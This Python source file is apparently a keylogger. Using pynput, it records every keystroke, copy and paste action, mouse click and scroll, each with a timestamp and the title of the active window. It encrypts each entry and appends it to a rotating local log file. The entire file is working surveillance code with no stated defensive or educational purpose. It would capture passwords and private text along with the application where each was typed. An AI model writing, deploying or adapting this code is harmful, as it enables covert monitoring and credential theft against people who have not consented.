from pynput import keyboard, mouse
import os
from encryption import generate_key, encrypt_data
from utils import timestamp, get_active_window, rotate_logs

LOG_FILE = "logs/activity.log"
os.makedirs("logs", exist_ok=True)

key = generate_key()

pressed_keys = set()


def write_log(event):
    rotate_logs()

    encrypted = encrypt_data(event, key)

    with open(LOG_FILE, "a") as f:
        f.write(encrypted + "\n")


# ---- KEYBOARD EVENTS ----
def on_press(k):
    global pressed_keys

    try:
        k_str = k.char
    except:
        k_str = str(k)

    pressed_keys.add(k_str)

    # Detect copy/paste
    if "Key.ctrl_l" in pressed_keys or "Key.ctrl_r" in pressed_keys:
        if k_str == "c":
            write_log(f"{timestamp()} [COPY] | Window: {get_active_window()}")
        if k_str == "v":
            write_log(f"{timestamp()} [PASTE] | Window: {get_active_window()}")

    write_log(f"{timestamp()} [KEY] {k_str} | Window: {get_active_window()}")


def on_release(k):
    global pressed_keys
    try:
        pressed_keys.remove(k.char)
    except:
        pressed_keys.discard(str(k))


# ---- MOUSE EVENTS ----
def on_click(x, y, button, pressed):
    if pressed:
        write_log(f"{timestamp()} [MOUSE CLICK] {button} at ({x},{y}) | Window: {get_active_window()}")


def on_scroll(x, y, dx, dy):
    write_log(f"{timestamp()} [SCROLL] ({dx},{dy}) at ({x},{y}) | Window: {get_active_window()}")


# ---- START LISTENERS ----
keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()
